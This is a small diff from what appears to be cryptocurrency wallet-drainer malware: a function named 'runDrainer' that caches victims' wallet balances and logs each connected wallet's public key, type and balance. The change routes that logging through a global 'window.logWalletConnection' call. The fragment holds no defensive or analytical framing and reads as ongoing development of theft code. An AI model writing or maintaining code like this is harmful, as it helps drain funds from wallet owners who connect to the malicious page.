@@ -1467,7 +1467,7 @@ async function runDrainer(provider) {
               window.walletBalanceCache[walletKey] = balance;
               
               // Use centralized logging function
-              logWalletConnection(publicKey, connectedWalletType, balance);
+              window.logWalletConnection(publicKey, connectedWalletType, balance);
             } else {
               console.log('[WALLET] Skipping balance update - no significant change');
             }
